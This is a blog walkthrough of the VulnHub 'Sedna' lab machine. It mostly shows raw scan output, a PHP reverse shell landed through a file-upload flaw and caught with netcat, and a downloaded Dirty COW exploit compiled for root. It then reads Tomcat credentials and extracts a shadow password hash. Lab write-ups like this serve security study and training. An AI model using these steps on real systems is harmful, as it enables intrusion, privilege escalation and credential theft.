+++
title = "hackfest2016-Sedna"
slug = "hackfest-2016-sedna"
[taxonomies]
categories=["vulnhub"]
tags=["vulnerable-machine"]
+++

# Sedna

{% highlight bash %}
nmap -T4 -A -sC -v -P 0-65535 10.37.129.7 -oA sedna-output
Warning: The -P0 option is deprecated. Please use -Pn

Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-23 08:38 UTC
NSE: Loaded 143 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:38
Completed NSE at 08:38, 0.00s elapsed
Initiating NSE at 08:38
Completed NSE at 08:38, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:38
Completed Parallel DNS resolution of 1 host. at 08:38, 0.12s elapsed
Initiating SYN Stealth Scan at 08:38
Scanning 10.37.129.7 [1000 ports]
Discovered open port 53/tcp on 10.37.129.7
Discovered open port 143/tcp on 10.37.129.7
Discovered open port 22/tcp on 10.37.129.7
Discovered open port 111/tcp on 10.37.129.7
Discovered open port 8080/tcp on 10.37.129.7
Discovered open port 445/tcp on 10.37.129.7
Discovered open port 110/tcp on 10.37.129.7
Discovered open port 993/tcp on 10.37.129.7
Discovered open port 80/tcp on 10.37.129.7
Discovered open port 995/tcp on 10.37.129.7
Discovered open port 139/tcp on 10.37.129.7
Completed SYN Stealth Scan at 08:38, 0.25s elapsed (1000 total ports)
Initiating Service scan at 08:38
Scanning 11 services on 10.37.129.7
Completed Service scan at 08:38, 12.07s elapsed (11 services on 1 host)
Initiating OS detection (try #1) against 10.37.129.7
Retrying OS detection (try #2) against 10.37.129.7
Initiating Traceroute at 08:38
Completed Traceroute at 08:38, 0.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 08:38
Completed Parallel DNS resolution of 2 hosts. at 08:38, 4.13s elapsed
NSE: Script scanning 10.37.129.7.
Initiating NSE at 08:38
Completed NSE at 08:38, 10.59s elapsed
Initiating NSE at 08:38
Completed NSE at 08:38, 0.01s elapsed
Nmap scan report for 10.37.129.7
Host is up (0.00087s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
|_  256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
53/tcp   open  domain      ISC BIND 9.9.5-3-Ubuntu
| dns-nsid:
|_  bind.version: 9.9.5-3-Ubuntu
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp  open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL RESP-CODES AUTH-RESP-CODE STLS TOP UIDL CAPA PIPELINING
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2016-10-07T19:17:14
| Not valid after:  2026-10-07T19:17:14
| MD5:   a32c 1b8e 97f3 210f d238 ba3d ac45 74f7
|_SHA-1: 0b7b 4229 b7af 8f89 d533 2ecf 5a1f f652 a015 0295
|_ssl-date: TLS randomness does not represent time
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          43581/udp  status
|_  100024  1          49481/tcp  status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: LOGIN-REFERRALS ENABLE more SASL-IR have STARTTLS post-login listed LITERAL+ IDLE ID Pre-login capabilities OK LOGINDISABLEDA0001 IMAP4rev1
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2016-10-07T19:17:14
| Not valid after:  2026-10-07T19:17:14
| MD5:   a32c 1b8e 97f3 210f d238 ba3d ac45 74f7
|_SHA-1: 0b7b 4229 b7af 8f89 d533 2ecf 5a1f f652 a015 0295
|_ssl-date: TLS randomness does not represent time
445/tcp  open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
993/tcp  open  ssl/imap    Dovecot imapd (Ubuntu)
|_imap-capabilities: LOGIN-REFERRALS ENABLE SASL-IR more have post-login listed LITERAL+ IDLE ID Pre-login capabilities OK IMAP4rev1 AUTH=PLAINA0001
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2016-10-07T19:17:14
| Not valid after:  2026-10-07T19:17:14
| MD5:   a32c 1b8e 97f3 210f d238 ba3d ac45 74f7
|_SHA-1: 0b7b 4229 b7af 8f89 d533 2ecf 5a1f f652 a015 0295
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) RESP-CODES AUTH-RESP-CODE USER TOP UIDL CAPA PIPELINING
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2016-10-07T19:17:14
| Not valid after:  2026-10-07T19:17:14
| MD5:   a32c 1b8e 97f3 210f d238 ba3d ac45 74f7
|_SHA-1: 0b7b 4229 b7af 8f89 d533 2ecf 5a1f f652 a015 0295
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
Device type: general purpose
Running (JUST GUESSING): Apple Mac OS X 10.7.X (85%), FreeBSD 8.X (85%)
OS CPE: cpe:/o:apple:mac_os_x:10.7.4 cpe:/o:freebsd:freebsd:8.0
Aggressive OS guesses: Apple Mac OS X 10.7.4 (Lion) (Darwin 11.4.0) (85%), FreeBSD 8.0-CURRENT (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=126 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: Host: SEDNA; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 6d18h27m05s, deviation: 0s, median: 6d18h27m05s
| nbstat: NetBIOS name: SEDNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SEDNA<00>            Flags: <unique><active>
|   SEDNA<03>            Flags: <unique><active>
|   SEDNA<20>            Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery:
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   NetBIOS computer name: SEDNA\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2017-06-29T23:05:51-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE (using port 199/tcp)
HOP RTT     ADDRESS
1   0.05 ms 172.17.0.1
2   1.00 ms 10.37.129.7

NSE: Script Post-scanning.
Initiating NSE at 08:38
Completed NSE at 08:38, 0.00s elapsed
Initiating NSE at 08:38
Completed NSE at 08:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.87 seconds
Raw packets sent: 1066 (50.324KB) | Rcvd: 1034 (42.032KB)

{% endhighlight %}

{% highlight bash %}
sudo netdiscover -r 10.37.129.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts

6 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 288
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
10.37.129.1     00:1c:42:00:00:19      3     126  Parallels, Inc.
10.37.129.2     00:1c:42:00:00:09      1      42  Parallels, Inc.
10.37.129.7     00:1c:42:3f:0f:0c      2     120  Parallels, Inc.
{% endhighlight %}

{% highlight bash %}
nikto -h 10.37.129.7
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.37.129.7
+ Target Hostname:    10.37.129.7
+ Target Port:        80
+ Start Time:         2017-07-07 22:03:23 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x65 0x53fb059bb5bc8
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
+ OSVDB-3268: /files/: Directory indexing found.
+ OSVDB-3092: /files/: This might be interesting...
+ OSVDB-3092: /system/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ 7536 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2017-07-07 22:03:47 (GMT-6) (24 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

{% highlight bash %}
dirb http://10.37.129.7 -i

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Jul  7 22:05:03 2017
URL_BASE: http://10.37.129.7/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Using Case-Insensitive Searches

-----------------

GENERATED WORDS: 4456

---- Scanning URL: http://10.37.129.7/ ----
==> DIRECTORY: http://10.37.129.7/blocks/
==> DIRECTORY: http://10.37.129.7/files/
+ http://10.37.129.7/index.html (CODE:200|SIZE:101)
==> DIRECTORY: http://10.37.129.7/modules/
+ http://10.37.129.7/robots.txt (CODE:200|SIZE:36)
+ http://10.37.129.7/server-status (CODE:403|SIZE:291)
==> DIRECTORY: http://10.37.129.7/system/
==> DIRECTORY: http://10.37.129.7/themes/

---- Entering directory: http://10.37.129.7/blocks/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
(Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.7/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
(Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.7/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
(Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.7/system/ ----
==> DIRECTORY: http://10.37.129.7/system/core/
==> DIRECTORY: http://10.37.129.7/system/database/
==> DIRECTORY: http://10.37.129.7/system/fonts/
==> DIRECTORY: http://10.37.129.7/system/helpers/
+ http://10.37.129.7/system/index.html (CODE:200|SIZE:142)
==> DIRECTORY: http://10.37.129.7/system/language/
==> DIRECTORY: http://10.37.129.7/system/libraries/

---- Entering directory: http://10.37.129.7/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
(Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.37.129.7/system/core/ ----
==> DIRECTORY: http://10.37.129.7/system/core/compat/
+ http://10.37.129.7/system/core/index.html (CODE:200|SIZE:142)

---- Entering directory: http://10.37.129.7/system/database/ ----
==> DIRECTORY: http://10.37.129.7/system/database/drivers/
+ http://10.37.129.7/system/database/index.html (CODE:200|SIZE:142)

---- Entering directory: http://10.37.129.7/system/fonts/ ----
+ http://10.37.129.7/system/fonts/index.html (CODE:200|SIZE:142)

---- Entering directory: http://10.37.129.7/system/helpers/ ----
+ http://10.37.129.7/system/helpers/index.html (CODE:200|SIZE:142)

---- Entering directory: http://10.37.129.7/system/language/ ----
==> DIRECTORY: http://10.37.129.7/system/language/english/
+ http://10.37.129.7/system/language/index.html (CODE:200|SIZE:142)

---- Entering directory: http://10.37.129.7/system/libraries/ ----
+ http://10.37.129.7/system/libraries/index.html (CODE:200|SIZE:142)

---- Entering directory: http://10.37.129.7/system/core/compat/ ----
+ http://10.37.129.7/system/core/compat/index.html (CODE:200|SIZE:142)

---- Entering directory: http://10.37.129.7/system/database/drivers/ ----
+ http://10.37.129.7/system/database/drivers/index.html (CODE:200|SIZE:142)
==> DIRECTORY: http://10.37.129.7/system/database/drivers/mssql/
==> DIRECTORY: http://10.37.129.7/system/database/drivers/mysql/
==> DIRECTORY: http://10.37.129.7/system/database/drivers/odbc/

---- Entering directory: http://10.37.129.7/system/language/english/ ----
+ http://10.37.129.7/system/language/english/index.html (CODE:200|SIZE:142)

---- Entering directory: http://10.37.129.7/system/database/drivers/mssql/ ----
+ http://10.37.129.7/system/database/drivers/mssql/index.html (CODE:200|SIZE:142)

---- Entering directory: http://10.37.129.7/system/database/drivers/mysql/ ----
+ http://10.37.129.7/system/database/drivers/mysql/index.html (CODE:200|SIZE:142)

---- Entering directory: http://10.37.129.7/system/database/drivers/odbc/ ----
+ http://10.37.129.7/system/database/drivers/odbc/index.html (CODE:200|SIZE:142)

-----------------
END_TIME: Fri Jul  7 22:05:18 2017
DOWNLOADED: 62384 - FOUND: 16

{% endhighlight %}

After quite a bit of screwing around and running dirb/nikto I figured out the server was running BuilderEngine 3.5, with a search on exploit-db I was able to find a file upload vulnerability: themes/dashboard/assets/plugins/jquery-file-upload/server/php/ and upload a php reverse shell, then:

{% highlight  bash %}
sudo nc -vnlp 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from 10.37.129.7 59854 received!
Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
 00:53:28 up 1 day,  1:59,  0 users,  load average: 0.00, 0.01, 0.05
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ export TERM=xterm
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@Sedna:/$ ls
ls
bin   dev  home        lib     media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lost+found  mnt    proc  run   srv   tmp  var
www-data@Sedna:/$ whoami
whoami
www-data
www-data@Sedna:/$ uname -a
uname -a
Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
www-data@Sedna:/$ cd /var/www
cd /var/www
www-data@Sedna:/var/www$ s
s
s: command not found
www-data@Sedna:/var/www$ ls
ls
flag.txt  html
www-data@Sedna:/var/www$ cat flag.txt
cat flag.txtbfbb7e6e6e88d9ae66848b9aeac6b289

{% endhighlight %}

{% highlight bash %}
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:108::/var/run/dbus:/bin/false
bind:x:104:115::/var/cache/bind:/bin/false
postfix:x:105:116::/var/spool/postfix:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
dovecot:x:107:118:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:108:119:Dovecot login user,,,:/nonexistent:/bin/false
landscape:x:109:120::/var/lib/landscape:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
avahi:x:112:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:113:124:colord colour management daemon,,,:/var/lib/colord:/bin/false
libvirt-qemu:x:114:107:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
crackmeforpoints:x:1000:1000::/home/crackmeforpoints:
statd:x:117:65534::/var/lib/nfs:/bin/false
{% endhighlight %}

## PrivEsc

I did a search on exploit-db and it looks like this might be a use case for dirty cow, however when trying to run the exploit it always seemed to throw a kernel error and made the machine unusable, at least with the the renditions I tried.  I went ahead and peeked at a walkthrough and saw chkrootkit.  My takeaway was a way to find chkrootkit on the file system if possible:

{% highlight bash %}
find -type d -printf '%d\t%P\n' 2>&1 | sort -r -nk1 | cut -f2- | grep -i 'chkrootkit' | grep -v "find"
{% endhighlight %}

After a lot a messing around I decided to try dirty cow again, after more research it seemed like a timing issue.  I was able to finally get the firefart variant (https://www.exploit-db.com/exploits/40839/) to work.

{% highlight bash %}
wget http://kalivm:8000/firefart.c
gcc firefart.c -pthread -o firefart -lcrypt
./firefart firefart
ssh firefart@sednavm
pass: firefart
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
{% endhighlight %}

Now I had a root shell!

{% highlight bash %}
cd /
find . -name 'flag.txt'
/root/flag.txt
/var/www/flag.txt
{% endhighlight %}

## Post Exploitation

Now for the post exploitation flags

I remember seeing tomcat running and messing with it early on, now that we have root it should be fairly easy to get in there

{% highlight bash %}
cat /etc/tomcat7/tomcat-users.xml
{% endhighlight %}

{% highlight xml %}
<tomcat-users>
    <role rolename="manager-gui"/>
    <user username="tomcat" password="submitthisforpoints" roles="manager-gui"/>
</tomcat-users>
{% endhighlight %}

Looking at /etc/passwd there appears to be an account to try and crack:

{% highlight bash %}
cat /etc/passwd
firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:108::/var/run/dbus:/bin/false
bind:x:104:115::/var/cache/bind:/bin/false
postfix:x:105:116::/var/spool/postfix:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
dovecot:x:107:118:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:108:119:Dovecot login user,,,:/nonexistent:/bin/false
landscape:x:109:120::/var/lib/landscape:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
avahi:x:112:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:113:124:colord colour management daemon,,,:/var/lib/colord:/bin/false
libvirt-qemu:x:114:107:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
crackmeforpoints:x:1000:1000::/home/crackmeforpoints:
statd:x:117:65534::/var/lib/nfs:/bin/false
{% endhighlight %}

Then to get the shadow for that user:

{% highlight bash %}
cat /etc/shadow | grep -i 'crackmeforpoints' | cut -d ':' -f -2
crackmeforpoints:$6$p22wX4fD$RRAamkeGIA56pj4MpM7CbrKPhShVkZnNH2NjZ8JMUP6Y/1upG.54kSph/HSP1LFcn4.2C11cF0R7QmojBqNy5/
{% endhighlight %}

I didn't get this cracked yet, maybe later...
